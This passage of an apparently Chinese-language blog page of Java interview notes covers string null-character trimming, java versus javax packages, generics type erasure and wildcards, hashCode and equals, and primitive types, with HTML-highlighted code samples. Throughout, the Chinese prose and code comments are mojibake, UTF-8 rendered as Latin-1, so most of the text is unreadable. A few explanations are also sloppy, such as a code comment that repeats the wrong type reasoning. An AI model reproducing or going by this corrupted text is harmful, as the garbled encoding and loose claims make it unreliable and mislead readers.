‡è¯†å­—ç¬¦ä¸²çš„ç»“æŸã€‚<br>javaå’Œcé€šä¿¡çš„æ—¶å€™ï¼Œç”±äºcä¸­çš„charä¸­æœ‰ç»“æŸç¬¦çš„ï¼Œæ‰€ä»¥å½“javaæ”¶åˆ°Cå‘æ¥çš„å­—ç¬¦ä¸²æ—¶ï¼Œåé¢å¾€å¾€ä¼šæœ‰è‹¥å¹²ç©ºå­—ç¬¦ï¼Œå¦‚æœä¸åšå¤„ç†çš„è¯ï¼Œjavaä¼šå¯¹å…¶ä¸€å¹¶è¾“å‡ºï¼Œä¸ºäº†å°†ç©ºå­—ç¬¦å¤„ç†æ‰ä¸è¾“å‡ºï¼Œå¯ä»¥é‡‡ç”¨å¦‚ä¸‹ä¸¤ç§æ–¹æ³•ï¼š</p>
<p>æ–¹æ³•ä¸€:</p>
<p>è°ƒç”¨javaå­—ç¬¦ä¸²çš„trim()æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¼šå°†å­—ç¬¦ä¸²å‰åçš„ç©ºå­—ç¬¦éƒ½å»æ‰ã€‚</p>
<p>æ–¹æ³•äºŒï¼š</p>
<p>è‡ªå·±å®ç°å»æ‰å°¾éƒ¨ç©ºå­—ç¬¦çš„æ–¹æ³•</p>
</blockquote>
</li>
</ol>
<h4 id="import-javaå’Œjavax-çš„åŒºåˆ«"><a href="#import-javaå’Œjavax-çš„åŒºåˆ«" class="headerlink" title="import javaå’Œjavax çš„åŒºåˆ«?"></a>import javaå’Œjavax çš„åŒºåˆ«?</h4><p>åˆšå¼€å§‹çš„æ—¶å€™ JavaAPI æ‰€å¿…éœ€çš„åŒ…æ˜¯ java å¼€å¤´çš„åŒ…ï¼Œjavax å½“æ—¶åªæ˜¯æ‰©å±• API åŒ…æ¥ä½¿ç”¨ã€‚ç„¶è€Œéšç€æ—¶é—´çš„æ¨ç§»ï¼Œjavax é€æ¸åœ°æ‰©å±•æˆä¸º Java API çš„ç»„æˆéƒ¨åˆ†ã€‚ä½†æ˜¯ï¼Œå°†æ‰©å±•ä» javax åŒ…ç§»åŠ¨åˆ° java åŒ…ç¡®å®å¤ªéº»çƒ¦äº†ï¼Œæœ€ç»ˆä¼šç ´åä¸€å †ç°æœ‰çš„ä»£ç ã€‚å› æ­¤ï¼Œæœ€ç»ˆå†³å®š javax åŒ…å°†æˆä¸ºæ ‡å‡† API çš„ä¸€éƒ¨åˆ†ã€‚</p>
<p>æ‰€ä»¥ï¼Œå®é™…ä¸Š java å’Œ javax æ²¡æœ‰åŒºåˆ«ã€‚è¿™éƒ½æ˜¯ä¸€ä¸ªåå­—ã€‚</p>
<h4 id="ä¸ºä»€ä¹ˆè¯´javaè¯­è¨€â€œç¼–è¯‘ä¸è§£é‡Šå¹¶å­˜â€"><a href="#ä¸ºä»€ä¹ˆè¯´javaè¯­è¨€â€œç¼–è¯‘ä¸è§£é‡Šå¹¶å­˜â€" class="headerlink" title="ä¸ºä»€ä¹ˆè¯´javaè¯­è¨€â€œç¼–è¯‘ä¸è§£é‡Šå¹¶å­˜â€?"></a>ä¸ºä»€ä¹ˆè¯´javaè¯­è¨€â€œç¼–è¯‘ä¸è§£é‡Šå¹¶å­˜â€?</h4><p>é«˜çº§ç¼–ç¨‹è¯­è¨€æŒ‰ç…§ç¨‹åºçš„æ‰§è¡Œæ–¹å¼åˆ†ä¸ºç¼–è¯‘å‹å’Œè§£é‡Šå‹ä¸¤ç§ã€‚ç®€å•æ¥è¯´ï¼Œç¼–è¯‘å‹è¯­è¨€æ˜¯æŒ‡ç¼–è¯‘å™¨é’ˆå¯¹ç‰¹å®šçš„æ“ä½œç³»ç»Ÿå°†æºä»£ç ä¸€æ¬¡æ€§ç¿»è¯‘æˆå¯è¢«è¯¥å¹³å°æ‰§è¡Œçš„æœºå™¨ç ï¼›è§£é‡Šå‹è¯­è¨€æ˜¯æŒ‡è§£é‡Šå™¨å¯¹æºç¨‹åºé€è¡Œè§£é‡Šæˆç‰¹å®šå¹³å°çš„æœºå™¨ç å¹¶ç«‹å³æ‰§è¡Œã€‚æ¯”å¦‚ï¼Œ<strong>ä½ æƒ³é˜…è¯»ä¸€æœ¬è‹±æ–‡åè‘—ï¼Œä½ å¯ä»¥æ‰¾ä¸€ä¸ªè‹±æ–‡ç¿»è¯‘äººå‘˜å¸®åŠ©ä½ é˜…è¯»ï¼Œ æœ‰ä¸¤ç§é€‰æ‹©æ–¹å¼ï¼Œä½ å¯ä»¥å…ˆç­‰ç¿»è¯‘äººå‘˜å°†å…¨æœ¬çš„è‹±æ–‡åè‘—ï¼ˆä¹Ÿå°±æ˜¯æºç ï¼‰éƒ½ç¿»è¯‘æˆæ±‰è¯­ï¼Œå†å»é˜…è¯»ï¼Œä¹Ÿå¯ä»¥è®©ç¿»è¯‘äººå‘˜ç¿»è¯‘ä¸€æ®µï¼Œä½ åœ¨æ—è¾¹é˜…è¯»ä¸€æ®µï¼Œæ…¢æ…¢æŠŠä¹¦è¯»å®Œã€‚</strong></p>
<p>Java è¯­è¨€æ—¢å…·æœ‰ç¼–è¯‘å‹è¯­è¨€çš„ç‰¹å¾ï¼Œä¹Ÿå…·æœ‰è§£é‡Šå‹è¯­è¨€çš„ç‰¹å¾ï¼Œå› ä¸º Java ç¨‹åºè¦ç»è¿‡å…ˆç¼–è¯‘ï¼Œåè§£é‡Šä¸¤ä¸ªæ­¥éª¤ï¼Œç”± Java ç¼–å†™çš„ç¨‹åºéœ€è¦å…ˆç»è¿‡ç¼–è¯‘æ­¥éª¤ï¼Œç”Ÿæˆå­—èŠ‚ç ï¼ˆ*.class æ–‡ä»¶ï¼‰ï¼Œè¿™ç§å­—èŠ‚ç å¿…é¡»ç”± Java è§£é‡Šå™¨æ¥è§£é‡Šæ‰§è¡Œã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥è®¤ä¸º Java è¯­è¨€ç¼–è¯‘ä¸è§£é‡Šå¹¶å­˜ã€‚</p>
<h4 id="å­—ç¬¦å‹å¸¸é‡å’Œå­—ç¬¦ä¸²å¸¸é‡çš„åŒºåˆ«"><a href="#å­—ç¬¦å‹å¸¸é‡å’Œå­—ç¬¦ä¸²å¸¸é‡çš„åŒºåˆ«" class="headerlink" title="å­—ç¬¦å‹å¸¸é‡å’Œå­—ç¬¦ä¸²å¸¸é‡çš„åŒºåˆ«?"></a>å­—ç¬¦å‹å¸¸é‡å’Œå­—ç¬¦ä¸²å¸¸é‡çš„åŒºåˆ«?</h4><ol>
<li><p>å½¢å¼ä¸Š: å­—ç¬¦å¸¸é‡æ˜¯å•å¼•å·å¼•èµ·çš„ä¸€ä¸ªå­—ç¬¦;å­—ç¬¦ä¸²å¸¸é‡æ˜¯åŒå¼•å·å¼•èµ·çš„0ä¸ªæˆ–è‹¥å¹²çš„å­—ç¬¦</p>
</li>
<li><p>å«ä¹‰ä¸Š: å­—ç¬¦å¸¸é‡ç›¸å½“äºä¸€ä¸ªæ•´å½¢å€¼(ASCIIå€¼),å¯ä»¥å‚ä¸è¡¨è¾¾å¼çš„è¿ç®—;å­—ç¬¦ä¸²å¸¸é‡ä»£è¡¨ä¸€ä¸ªåœ°å€å€¼(è¯¥å­—ç¬¦ä¸²åœ¨å†…å­˜ä¸­çš„å­˜æ”¾ä½ç½®)</p>
</li>
<li><p>å å†…å­˜å¤§å°: å­—ç¬¦å¸¸é‡åªå ä¸¤ä¸ªå­—èŠ‚; å­—ç¬¦ä¸²å¸¸é‡å è‹¥å¹²ä¸ªå­—èŠ‚.</p>
<blockquote>
<p>javaåŸºæœ¬ç±»å‹æ‰€å å­˜å‚¨ç©ºé—´çš„å¤§å°ä¸åƒå…¶ä»–è¯­è¨€é‚£æ ·éšæœºå™¨ç¡¬ä»¶æ¶æ„çš„å˜åŒ–è€Œå˜åŒ–.è¿™ä¸­æ‰€å å­˜å‚¨ç©ºé—´çš„å¤§å°çš„ä¸å˜çš„æ€§è´¨æ˜¯javaç¨‹åºæ¯”å…¶ä»–å¤§å¤šæ•°è¯­è¨€ç¼–å†™çš„ç¨‹åºæ›´å…·æœ‰å¯ç§»æ¤æ€§çš„åŸå› ä¹‹ä¸€.</p>
</blockquote>
</li>
</ol>
<h4 id="æ ‡è¯†ç¬¦å’Œå…³é”®å­—çš„åŒºåˆ«"><a href="#æ ‡è¯†ç¬¦å’Œå…³é”®å­—çš„åŒºåˆ«" class="headerlink" title="æ ‡è¯†ç¬¦å’Œå…³é”®å­—çš„åŒºåˆ«?"></a>æ ‡è¯†ç¬¦å’Œå…³é”®å­—çš„åŒºåˆ«?</h4><p>æ ‡è¯†ç¬¦å°±æ˜¯ä¸€ä¸ªåå­—ã€‚</p>
<p>å…³é”®å­—æ˜¯è¢«èµ‹äºˆç‰¹æ®Šå«ä¹‰çš„æ ‡è¯†ç¬¦ã€‚æ¯”å¦‚è­¦å¯Ÿå±€å°±æ˜¯ä¸€ä¸ªå…³é”®å­—ã€‚</p>
<h4 id="Javaæ³›å‹-ä»€ä¹ˆæ˜¯ç±»å‹æ“¦é™¤-ä»‹ç»ä¸€ä¸‹å¸¸ç”¨çš„é€šé…ç¬¦"><a href="#Javaæ³›å‹-ä»€ä¹ˆæ˜¯ç±»å‹æ“¦é™¤-ä»‹ç»ä¸€ä¸‹å¸¸ç”¨çš„é€šé…ç¬¦" class="headerlink" title="Javaæ³›å‹?ä»€ä¹ˆæ˜¯ç±»å‹æ“¦é™¤? ä»‹ç»ä¸€ä¸‹å¸¸ç”¨çš„é€šé…ç¬¦?"></a>Javaæ³›å‹?ä»€ä¹ˆæ˜¯ç±»å‹æ“¦é™¤? ä»‹ç»ä¸€ä¸‹å¸¸ç”¨çš„é€šé…ç¬¦?</h4><p>Java æ³›å‹ï¼ˆgenericsï¼‰æ˜¯ JDK 5 ä¸­å¼•å…¥çš„ä¸€ä¸ªæ–°ç‰¹æ€§, æ³›å‹æä¾›äº†ç¼–è¯‘æ—¶ç±»å‹å®‰å…¨æ£€æµ‹æœºåˆ¶ï¼Œè¯¥æœºåˆ¶å…è®¸ç¨‹åºå‘˜åœ¨ç¼–è¯‘æ—¶æ£€æµ‹åˆ°éæ³•çš„ç±»å‹ã€‚æ³›å‹çš„æœ¬è´¨æ˜¯å‚æ•°åŒ–ç±»å‹ï¼Œä¹Ÿå°±æ˜¯è¯´æ‰€æ“ä½œçš„æ•°æ®ç±»å‹è¢«æŒ‡å®šä¸ºä¸€ä¸ªå‚æ•°ã€‚</p>
<p>Javaçš„æ³›å‹æ˜¯ä¼ªæ³›å‹,è¿™æ˜¯å› ä¸ºjavaåœ¨ç¼–è¯‘æœŸé—´,æ‰€æœ‰çš„æ³›å‹ä¿¡æ¯éƒ½ä¼šè¢«æ“¦æ‰,è¿™ä¹Ÿå°±æ˜¯é€šå¸¸æ‰€è¯´çš„ç±»å‹æ“¦é™¤; åœ¨è¿è¡ŒæœŸé—´é€šè¿‡åå°„åˆ›å»ºå¯¹è±¡å°±å¯ä»¥ä»»æ„æ·»åŠ å…¶ä»–ç±»å‹çš„å¯¹è±¡;</p>
<p>Javaç¼–è¯‘å™¨ä¼šåœ¨ç¼–è¯‘æ—¶å°½å¯èƒ½çš„å‘ç°å¯èƒ½å‡ºé”™çš„åœ°æ–¹ï¼Œä½†æ˜¯ä»ç„¶æ— æ³•åœ¨è¿è¡Œæ—¶åˆ»å‡ºç°çš„ç±»å‹è½¬æ¢å¼‚å¸¸çš„æƒ…å†µï¼Œç±»å‹æ“¦é™¤ä¹Ÿæ˜¯Javaçš„æ³›å‹ä¸C++æ¨¡æ¿æœºåˆ¶å®ç°æ–¹å¼ä¹‹é—´çš„é‡è¦åŒºåˆ«ã€‚</p>
<p>ç±»å‹æ£€æŸ¥å°±æ˜¯é’ˆå¯¹å¼•ç”¨çš„ï¼Œè°æ˜¯ä¸€ä¸ªå¼•ç”¨ï¼Œç”¨è¿™ä¸ªå¼•ç”¨è°ƒç”¨æ³›å‹æ–¹æ³•ï¼Œå°±ä¼šå¯¹è¿™ä¸ªå¼•ç”¨è°ƒç”¨çš„æ–¹æ³•è¿›è¡Œç±»å‹æ£€æµ‹ï¼Œè€Œæ— å…³å®ƒçœŸæ­£å¼•ç”¨çš„å¯¹è±¡ã€‚</p>
<p><a href="https://www.cnblogs.com/wuqinglong/p/9456193.html">ã€ŠJava æ³›å‹ç±»å‹æ“¦é™¤ä»¥åŠç±»å‹æ“¦é™¤å¸¦æ¥çš„é—®é¢˜ã€‹</a></p>
<p><strong>åŸå§‹ç±»å‹</strong> å°±æ˜¯æ“¦é™¤å»äº†æ³›å‹ä¿¡æ¯ï¼Œæœ€ååœ¨å­—èŠ‚ç ä¸­çš„ç±»å‹å˜é‡çš„çœŸæ­£ç±»å‹ï¼Œæ— è®ºä½•æ—¶å®šä¹‰ä¸€ä¸ªæ³›å‹ï¼Œç›¸åº”çš„åŸå§‹ç±»å‹éƒ½ä¼šè¢«è‡ªåŠ¨æä¾›ï¼Œç±»å‹å˜é‡æ“¦é™¤ï¼Œå¹¶ä½¿ç”¨å…¶é™å®šç±»å‹ï¼ˆæ— é™å®šçš„å˜é‡ç”¨Objectï¼‰æ›¿æ¢ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Pair</span>&lt;T&gt; &#123;  </span><br><span class="line">    <span class="keyword">private</span> T value;  </span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">getValue</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> value;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(T  value)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.value = value;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// pairçš„åŸå§‹ç±»å‹</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pair</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> Object value;  </span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> value;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object  value)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.value = value;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Pairå¦‚æœè¿™æ ·å£°æ˜çš„è¯,é‚£ä¹ˆåŸå§‹ç±»å‹å°±æ˜¯Comparable</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Pair</span>&lt;T <span class="keyword">extends</span> <span class="title class_">Comparable</span>&gt; &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨è°ƒç”¨æ³›å‹æ–¹æ³•æ—¶ï¼Œå¯ä»¥æŒ‡å®šæ³›å‹ï¼Œä¹Ÿå¯ä»¥ä¸æŒ‡å®šæ³›å‹ã€‚</p>
<ul>
<li>åœ¨ä¸æŒ‡å®šæ³›å‹çš„æƒ…å†µä¸‹ï¼Œæ³›å‹å˜é‡çš„ç±»å‹ä¸ºè¯¥æ–¹æ³•ä¸­çš„å‡ ç§ç±»å‹çš„åŒä¸€çˆ¶ç±»çš„æœ€å°çº§ï¼Œç›´åˆ°Object</li>
<li>åœ¨æŒ‡å®šæ³›å‹çš„æƒ…å†µä¸‹ï¼Œè¯¥æ–¹æ³•çš„å‡ ç§ç±»å‹å¿…é¡»æ˜¯è¯¥æ³›å‹çš„å®ä¾‹çš„ç±»å‹æˆ–è€…å…¶å­ç±»</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="comment">/**ä¸æŒ‡å®šæ³›å‹çš„æ—¶å€™*/</span>  </span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> Test.add(<span class="number">1</span>, <span class="number">2</span>); <span class="comment">//è¿™ä¸¤ä¸ªå‚æ•°éƒ½æ˜¯Integerï¼Œæ‰€ä»¥Tä¸ºIntegerç±»å‹  </span></span><br><span class="line">        <span class="type">Number</span> <span class="variable">f</span> <span class="operator">=</span> Test.add(<span class="number">1</span>, <span class="number">1.2</span>); <span class="comment">//è¿™ä¸¤ä¸ªå‚æ•°ä¸€ä¸ªæ˜¯Integerï¼Œä»¥é£æ ¼æ˜¯Floatï¼Œæ‰€ä»¥å–åŒä¸€çˆ¶ç±»çš„æœ€å°çº§ï¼Œä¸ºNumber  </span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> Test.add(<span class="number">1</span>, <span class="string">&quot;asd&quot;</span>); <span class="comment">//è¿™ä¸¤ä¸ªå‚æ•°ä¸€ä¸ªæ˜¯Integerï¼Œä»¥é£æ ¼æ˜¯Floatï¼Œæ‰€ä»¥å–åŒä¸€çˆ¶ç±»çš„æœ€å°çº§ï¼Œä¸ºObject  </span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**æŒ‡å®šæ³›å‹çš„æ—¶å€™*/</span>  </span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> Test.&lt;Integer&gt;add(<span class="number">1</span>, <span class="number">2</span>); <span class="comment">//æŒ‡å®šäº†Integerï¼Œæ‰€ä»¥åªèƒ½ä¸ºIntegerç±»å‹æˆ–è€…å…¶å­ç±»  </span></span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> Test.&lt;Integer&gt;add(<span class="number">1</span>, <span class="number">2.2</span>); <span class="comment">//ç¼–è¯‘é”™è¯¯ï¼ŒæŒ‡å®šäº†Integerï¼Œä¸èƒ½ä¸ºFloat  </span></span><br><span class="line">        <span class="type">Number</span> <span class="variable">c</span> <span class="operator">=</span> Test.&lt;Number&gt;add(<span class="number">1</span>, <span class="number">2.2</span>); <span class="comment">//æŒ‡å®šä¸ºNumberï¼Œæ‰€ä»¥å¯ä»¥ä¸ºIntegerå’ŒFloat  </span></span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    <span class="comment">//è¿™æ˜¯ä¸€ä¸ªç®€å•çš„æ³›å‹æ–¹æ³•  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">add</span><span class="params">(T x,T y)</span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> y;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å› ä¸ºç±»å‹æ£€æŸ¥å°±æ˜¯ç¼–è¯‘æ—¶å®Œæˆçš„ï¼Œnew ArrayList()åªæ˜¯åœ¨å†…å­˜ä¸­å¼€è¾Ÿäº†ä¸€ä¸ªå­˜å‚¨ç©ºé—´ï¼Œå¯ä»¥å­˜å‚¨ä»»ä½•ç±»å‹å¯¹è±¡ï¼Œè€ŒçœŸæ­£è®¾è®¡ç±»å‹æ£€æŸ¥çš„æ˜¯å®ƒçš„å¼•ç”¨ï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯ä½¿ç”¨å®ƒå¼•ç”¨list1æ¥è°ƒç”¨å®ƒçš„æ–¹æ³•ï¼Œæ¯”å¦‚è¯´è°ƒç”¨addæ–¹æ³•ï¼Œæ‰€ä»¥list1å¼•ç”¨èƒ½å®Œæˆæ³›å‹ç±»å‹çš„æ£€æŸ¥ã€‚è€Œå¼•ç”¨list2æ²¡æœ‰ä½¿ç”¨æ³›å‹ï¼Œæ‰€ä»¥ä¸è¡Œã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList&lt;String&gt; list1 = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(); <span class="comment">//å¯ä»¥å®ç°ä¸å®Œå…¨ä½¿ç”¨æ³›å‹å‚æ•°ä¸€æ ·çš„æ•ˆæœ</span></span><br><span class="line"><span class="type">ArrayList</span> <span class="variable">list2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;(); <span class="comment">//æ²¡æœ‰æ•ˆæœ,ä¼šæœ‰ç¼–è¯‘æ—¶è­¦å‘Š</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;().add(<span class="string">&quot;11&quot;</span>); <span class="comment">//ç¼–è¯‘é€šè¿‡  </span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;().add(<span class="number">22</span>);   <span class="comment">//ç¼–è¯‘é”™è¯¯  </span></span><br></pre></td></tr></table></figure>

<h5 id="é€šé…ç¬¦"><a href="#é€šé…ç¬¦" class="headerlink" title="é€šé…ç¬¦"></a>é€šé…ç¬¦</h5><ul>
<li>ï¼Ÿ è¡¨ç¤ºä¸ç¡®å®šçš„ java ç±»å‹</li>
<li>T (type) è¡¨ç¤ºå…·ä½“çš„ä¸€ä¸ª java ç±»å‹</li>
<li>K V (key value) åˆ†åˆ«ä»£è¡¨ java é”®å€¼ä¸­çš„Key Value</li>
<li>E (element) ä»£è¡¨ Element</li>
</ul>
<p>æ›´å¤šå…³äº Java æ³›å‹ä¸­çš„é€šé…ç¬¦å¯ä»¥æŸ¥çœ‹è¿™ç¯‡æ–‡ç« ï¼š<a href="https://juejin.im/post/5d5789d26fb9a06ad0056bd9">ã€ŠèŠä¸€èŠ-JAVA æ³›å‹ä¸­çš„é€šé…ç¬¦ Tï¼ŒEï¼ŒKï¼ŒVï¼Œï¼Ÿã€‹</a></p>
<p>ï¼Ÿå’Œ T éƒ½è¡¨ç¤ºä¸ç¡®å®šçš„ç±»å‹ï¼ŒåŒºåˆ«åœ¨äºæˆ‘ä»¬å¯ä»¥å¯¹ T è¿›è¡Œæ“ä½œï¼Œä½†æ˜¯å¯¹ ï¼Ÿ ä¸è¡Œï¼Œæ¯”å¦‚å¦‚ä¸‹è¿™ç§ ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å¯ä»¥</span></span><br><span class="line"><span class="type">T</span> <span class="variable">t</span> <span class="operator">=</span> operate();</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸å¯ä»¥</span></span><br><span class="line">ï¼Ÿ car = operate();</span><br></pre></td></tr></table></figure>

<p>åŒºåˆ«1ï¼šé€šè¿‡Tæ¥ç¡®ä¿æ³›å‹å‚æ•°çš„ä¸€è‡´æ€§</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// é€šè¿‡ T æ¥ ç¡®ä¿ æ³›å‹å‚æ•°çš„ä¸€è‡´æ€§</span></span><br><span class="line"><span class="keyword">public</span> &lt;T <span class="keyword">extends</span> <span class="title class_">Number</span>&gt; <span class="keyword">void</span></span><br><span class="line"><span class="title function_">test</span><span class="params">(List&lt;T&gt; dest, List&lt;T&gt; src)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//é€šé…ç¬¦æ˜¯ ä¸ç¡®å®šçš„ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•ä¸èƒ½ä¿è¯ä¸¤ä¸ª List å…·æœ‰ç›¸åŒçš„å…ƒç´ ç±»å‹</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span></span><br><span class="line"><span class="title function_">test</span><span class="params">(List&lt;? extends Number&gt; dest, List&lt;? extends Number&gt; src)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åŒºåˆ«2ï¼šç±»å‹å‚æ•°å¯ä»¥å¤šé‡é™å®šè€Œé€šé…ç¬¦ä¸è¡Œ</p>
<p>åŒºåˆ«3ï¼šé€šé…ç¬¦å¯ä»¥ä½¿ç”¨è¶…ç±»é™å®šè€Œç±»å‹å‚æ•°ä¸è¡Œ</p>
<p>ç±»å‹å‚æ•° T åªå…·æœ‰ ä¸€ç§ ç±»å‹é™å®šæ–¹å¼ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">T extends A</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯é€šé…ç¬¦ ? å¯ä»¥è¿›è¡Œ ä¸¤ç§é™å®šï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">? extends A</span><br><span class="line">? super A</span><br></pre></td></tr></table></figure>

<h4 id="x3D-x3D-å’Œ-equals-çš„åŒºåˆ«"><a href="#x3D-x3D-å’Œ-equals-çš„åŒºåˆ«" class="headerlink" title="&#x3D;&#x3D; å’Œ equals çš„åŒºåˆ«"></a>&#x3D;&#x3D; å’Œ equals çš„åŒºåˆ«</h4><p>stringæ–¹æ³•çš„equalsé‡å†™è¿‡äº†</p>
<h4 id="hashcode-ä¸-equals"><a href="#hashcode-ä¸-equals" class="headerlink" title="hashcode() ä¸ equals()"></a>hashcode() ä¸ equals()</h4><p>hashcode() çš„ä½œç”¨æ˜¯è·å–å“ˆå¸Œç ï¼Œä¹Ÿç§°ä¸ºæ•£åˆ—ç ï¼›å®ƒå®é™…ä¸Šæ˜¯è¿”å›ä¸€ä¸ª int æ•´æ•°ã€‚è¿™ä¸ªå“ˆå¸Œç çš„ä½œç”¨æ˜¯ç¡®å®šè¯¥å¯¹è±¡åœ¨å“ˆå¸Œè¡¨ä¸­çš„ç´¢å¼•ä½ç½®ã€‚hashCode()å®šä¹‰åœ¨ JDK çš„ Object ç±»ä¸­ï¼Œè¿™å°±æ„å‘³ç€ Java ä¸­çš„ä»»ä½•ç±»éƒ½åŒ…å«æœ‰ hashCode() å‡½æ•°ã€‚å¦å¤–éœ€è¦æ³¨æ„çš„æ˜¯ï¼š Object çš„ hashcode æ–¹æ³•æ˜¯æœ¬åœ°æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯ç”¨ c è¯­è¨€æˆ– c++ å®ç°çš„ï¼Œè¯¥æ–¹æ³•é€šå¸¸ç”¨æ¥å°†å¯¹è±¡çš„ å†…å­˜åœ°å€ è½¬æ¢ä¸ºæ•´æ•°ä¹‹åè¿”å›ã€‚</p>
<p>å½“ä½ æŠŠå¯¹è±¡åŠ å…¥ HashSet æ—¶ï¼ŒHashSet ä¼šå…ˆè®¡ç®—å¯¹è±¡çš„ hashcode å€¼æ¥åˆ¤æ–­å¯¹è±¡åŠ å…¥çš„ä½ç½®ï¼ŒåŒæ—¶ä¹Ÿä¼šä¸å…¶ä»–å·²ç»åŠ å…¥çš„å¯¹è±¡çš„ hashcode å€¼ä½œæ¯”è¾ƒï¼Œå¦‚æœæ²¡æœ‰ç›¸ç¬¦çš„ hashcodeï¼ŒHashSet ä¼šå‡è®¾å¯¹è±¡æ²¡æœ‰é‡å¤å‡ºç°ã€‚ä½†æ˜¯å¦‚æœå‘ç°æœ‰ç›¸åŒ hashcode å€¼çš„å¯¹è±¡ï¼Œè¿™æ—¶ä¼šè°ƒç”¨ equals() æ–¹æ³•æ¥æ£€æŸ¥ hashcode ç›¸ç­‰çš„å¯¹è±¡æ˜¯å¦çœŸçš„ç›¸åŒã€‚å¦‚æœä¸¤è€…ç›¸åŒï¼ŒHashSetå°±ä¸ä¼šè®©å…¶åŠ å…¥æ“ä½œæˆåŠŸã€‚å¦‚æœä¸åŒçš„è¯ï¼Œå°±ä¼šé‡æ–°æ•£åˆ—åˆ°å…¶ä»–ä½ç½®ã€‚</p>
<p>å¦‚æœä¸¤ä¸ªå¯¹è±¡ç›¸ç­‰ï¼Œåˆ™ hashcode ä¸€å®šä¹Ÿæ˜¯ç›¸åŒçš„ã€‚ä¸¤ä¸ªå¯¹è±¡ç›¸ç­‰,å¯¹ä¸¤ä¸ªå¯¹è±¡åˆ†åˆ«è°ƒç”¨ equals æ–¹æ³•éƒ½è¿”å› trueã€‚ä½†æ˜¯ï¼Œä¸¤ä¸ªå¯¹è±¡æœ‰ç›¸åŒçš„ hashcode å€¼ï¼Œå®ƒä»¬ä¹Ÿä¸ä¸€å®šæ˜¯ç›¸ç­‰çš„ ã€‚å› æ­¤ï¼Œequals æ–¹æ³•è¢«è¦†ç›–è¿‡ï¼Œåˆ™ hashCode æ–¹æ³•ä¹Ÿå¿…é¡»è¢«è¦†ç›–ã€‚</p>
<blockquote>
<p>hashCode()çš„é»˜è®¤è¡Œä¸ºæ˜¯å¯¹å †ä¸Šçš„å¯¹è±¡äº§ç”Ÿç‹¬ç‰¹å€¼ã€‚å¦‚æœæ²¡æœ‰é‡å†™ hashCode()ï¼Œåˆ™è¯¥ class çš„ä¸¤ä¸ªå¯¹è±¡æ— è®ºå¦‚ä½•éƒ½ä¸ä¼šç›¸ç­‰ï¼ˆå³ä½¿è¿™ä¸¤ä¸ªå¯¹è±¡æŒ‡å‘ç›¸åŒçš„æ•°æ®ï¼‰</p>
</blockquote>
<h4 id="å…«ç§åŸºæœ¬ç±»å‹ã€åŒ…è£…ç±»ã€å¸¸é‡æ± "><a href="#å…«ç§åŸºæœ¬ç±»å‹ã€åŒ…è£…ç±»ã€å¸¸é‡æ± " class="headerlink" title="å…«ç§åŸºæœ¬ç±»å‹ã€åŒ…è£…ç±»ã€å¸¸é‡æ± "></a>å…«ç§åŸºæœ¬ç±»å‹ã€åŒ…è£…ç±»ã€å¸¸é‡æ± </h4><p>byte, char, short, int, long, float, double, boolean</p>
<p>1,2,2,4,8,4,8, æœªå®šä¹‰</p>
<p>Byte, Character, Short, Integer, Long, Float, Double, Boolean</p>
